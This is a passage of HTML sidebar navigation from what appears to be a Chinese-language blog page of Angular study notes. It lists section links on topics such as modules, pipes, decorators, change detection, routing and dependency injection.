href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#弹出webpack" class="sidebar-link">弹出webpack</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#环境变量注入" class="sidebar-link">环境变量注入</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngmodule" class="sidebar-link">ngModule</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#常用内置module" class="sidebar-link">常用内置Module</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#模块中的资源" class="sidebar-link">模块中的资源</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#coremodule" class="sidebar-link">coreModule</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#sharemodule-servicesmodule" class="sidebar-link">shareModule/ServicesModule</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#zorro11组件模块" class="sidebar-link">zorro11组件模块</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngmodules-esmodules-libraries" class="sidebar-link">NgModules/esModules/libraries</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#管道" class="sidebar-link">管道</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#angular管道分类" class="sidebar-link">angular管道分类</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#所有内置管道" class="sidebar-link">所有内置管道</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#asyncpipe-导致多次请求" class="sidebar-link">AsyncPipe 导致多次请求</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#asyncpipe-执行流程" class="sidebar-link">AsyncPipe 执行流程</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ng1管道对比" class="sidebar-link">ng1管道对比</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#管道参数" class="sidebar-link">管道参数</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#自定义管道" class="sidebar-link">自定义管道</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#管道链" class="sidebar-link">管道链</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#typescript" class="sidebar-link">Typescript</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#装饰器" class="sidebar-link">装饰器</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#常用内置装饰器" class="sidebar-link">常用内置装饰器</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#分类" class="sidebar-link">分类</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#类装饰器" class="sidebar-link">类装饰器</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#属性装饰器" class="sidebar-link">属性装饰器</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#方法装饰器" class="sidebar-link">方法装饰器</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#参数装饰器" class="sidebar-link">参数装饰器</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#object-defineproperty" class="sidebar-link">Object.defineProperty()</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#组件开始" class="sidebar-link">组件开始</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#插值表达式" class="sidebar-link">插值表达式</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#与-template" class="sidebar-link">* 与 &lt;template&gt;</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#viewencapsulation" class="sidebar-link">ViewEncapsulation</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#webcomponents标准" class="sidebar-link">WebComponents标准</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#shadow-dom" class="sidebar-link">Shadow DOM</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#viewencapsulation-none" class="sidebar-link">ViewEncapsulation.None</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#viewencapsulation-emulated" class="sidebar-link">ViewEncapsulation.Emulated</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#viewencapsulation-native" class="sidebar-link">ViewEncapsulation.Native</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#input-output" class="sidebar-link">Input/output</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#bindingpropertyname" class="sidebar-link">bindingPropertyName</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#eventemitter" class="sidebar-link">EventEmitter</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#inputs-outputs" class="sidebar-link">inputs/outputs</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#setter-getter" class="sidebar-link">setter/getter</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngonchanges" class="sidebar-link">ngOnChanges</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#双向数据绑定" class="sidebar-link">双向数据绑定</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#hostlistener-hostbinding" class="sidebar-link">HostListener/HostBinding</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#host-element" class="sidebar-link">Host Element</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#hostlistener" class="sidebar-link">HostListener</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#hosteventlistener" class="sidebar-link">HostEventListener</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#hostbinding" class="sidebar-link">HostBinding</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#hostpropertybindings" class="sidebar-link">HostPropertyBindings</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#viewchild-viewchildren" class="sidebar-link">ViewChild/ViewChildren</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#使用模板变量名" class="sidebar-link">使用模板变量名</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#设置查询条件" class="sidebar-link">设置查询条件</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#使用类型查询" class="sidebar-link">使用类型查询</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#查询策略" class="sidebar-link">查询策略</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#测试分析" class="sidebar-link">测试分析</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#设置合适策略" class="sidebar-link">设置合适策略</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#contentchild-contentchildren" class="sidebar-link">ContentChild/ContentChildren</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngprojectas" class="sidebar-link">ngProjectAs</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#多个ng-content-ngif-ngfor" class="sidebar-link">多个ng-content/ngIf/ngFor</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ng-template-ng-container" class="sidebar-link">ng-template/ng-container</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ref汇总" class="sidebar-link">Ref汇总</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#renderer-elementref" class="sidebar-link">Renderer/ElementRef</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#renderer-api" class="sidebar-link">Renderer API</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#templateref-viewcontainerref" class="sidebar-link">TemplateRef/ViewContainerRef</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#viewref-embeddedviewref" class="sidebar-link">ViewRef/EmbeddedViewRef</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#componentref" class="sidebar-link">ComponentRef</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#生命周期的陷阱" class="sidebar-link">生命周期的陷阱</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#applicationref" class="sidebar-link">ApplicationRef</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#变化检测" class="sidebar-link">变化检测</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#zones" class="sidebar-link">Zones</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngzone" class="sidebar-link">NgZone</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#onpush策略" class="sidebar-link">OnPush策略</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#changedetectorref" class="sidebar-link">ChangeDetectorRef</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngtemplateoutlet" class="sidebar-link">NgTemplateOutlet</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngcomponentoutlet" class="sidebar-link">NgComponentOutlet</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#angular-cdk" class="sidebar-link">Angular-Cdk</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#weakmap" class="sidebar-link">WeakMap</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#动态组件" class="sidebar-link">动态组件</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#使用viewcontainerref" class="sidebar-link">使用ViewContainerRef</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#使用ngcomponentoutlet" class="sidebar-link">使用ngComponentOutlet</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#使用applicationref" class="sidebar-link">使用ApplicationRef</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#使用-portals" class="sidebar-link">使用 Portals</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#组件通信" class="sidebar-link">组件通信</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#input-output-2" class="sidebar-link">@Input/@Output</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#模板变量" class="sidebar-link">模板变量</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#viewchild" class="sidebar-link">@ViewChild</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#messageservice" class="sidebar-link">MessageService</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#组件继承" class="sidebar-link">组件继承</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#指令" class="sidebar-link">指令</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#属性型指令" class="sidebar-link">属性型指令</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#自定义属性指令" class="sidebar-link">自定义属性指令</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#结构型指令" class="sidebar-link">结构型指令</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#自定义结构指令" class="sidebar-link">自定义结构指令</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#directive-component" class="sidebar-link">Directive/Component</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#生命周期" class="sidebar-link">生命周期</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#指令-组件共有" class="sidebar-link">指令/组件共有</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#组件特有" class="sidebar-link">组件特有</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#钩子作用-调用顺序" class="sidebar-link">钩子作用/调用顺序</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#lifecyclehooks接口" class="sidebar-link">LifecycleHooks接口</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#simplechange" class="sidebar-link">SimpleChange</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#simplechanges" class="sidebar-link">SimpleChanges</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#路由" class="sidebar-link">路由</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#路由要素" class="sidebar-link">路由要素</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#url传参" class="sidebar-link">URL传参</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#路由配置传参" class="sidebar-link">路由配置传参</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#查询参数传参" class="sidebar-link">查询参数传参</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#routerlinkactive" class="sidebar-link">routerLinkActive</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#activatedroute" class="sidebar-link">ActivatedRoute</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#snapshot" class="sidebar-link">snapshot</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#routerlink" class="sidebar-link">routerLink</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#navigate-navigatebyurl" class="sidebar-link">navigate/navigateByUrl</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#无组件路由" class="sidebar-link">无组件路由</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#命名路由" class="sidebar-link">命名路由</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#懒加载路由" class="sidebar-link">懒加载路由</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#预加载所有路由" class="sidebar-link">预加载所有路由</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#自定义预加载策略" class="sidebar-link">自定义预加载策略</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#路由事件" class="sidebar-link">路由事件</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#路由守卫" class="sidebar-link">路由守卫</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#路由重用" class="sidebar-link">路由重用</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#路由策略" class="sidebar-link">路由策略</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#history-对象" class="sidebar-link">History 对象</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#onpopstate-事件" class="sidebar-link">onpopstate 事件</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#reload-replace-location" class="sidebar-link">reload/replace/location</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#hash-模式" class="sidebar-link">Hash 模式</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#开启-hash-模式" class="sidebar-link">开启 Hash 模式</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#html-5-模式" class="sidebar-link">HTML 5 模式</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#开启-html-5-模式" class="sidebar-link">开启 HTML 5 模式</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#locationstrategy" class="sidebar-link">LocationStrategy</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#hashlocationstrategy" class="sidebar-link">HashLocationStrategy</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#platformlocation" class="sidebar-link">PlatformLocation</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#browserplatformlocation" class="sidebar-link">BrowserPlatformLocation</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#domadapter" class="sidebar-link">DomAdapter</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#initdomadapter" class="sidebar-link">initDomAdapter</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#getbasehref" class="sidebar-link">getBaseHref</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#platformlocation实例方法" class="sidebar-link">PlatformLocation实例方法</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#hashlocationstrategy实例方法" class="sidebar-link">HashLocationStrategy实例方法</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#pathlocationstrategy" class="sidebar-link">PathLocationStrategy</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#pathlocationstrategy实例方法" class="sidebar-link">PathLocationStrategy实例方法</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#事件" class="sidebar-link">事件</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ioc-di" class="sidebar-link">IoC/DI</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#provider接口" class="sidebar-link">Provider接口</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#useclass" class="sidebar-link">useClass</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#usevalue" class="sidebar-link">useValue</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#useexisting" class="sidebar-link">useExisting</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#usefactory" class="sidebar-link">useFactory</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#provider使用和解析" class="sidebar-link">Provider使用和解析</a></li><li class="sidebar-sub-header"><a 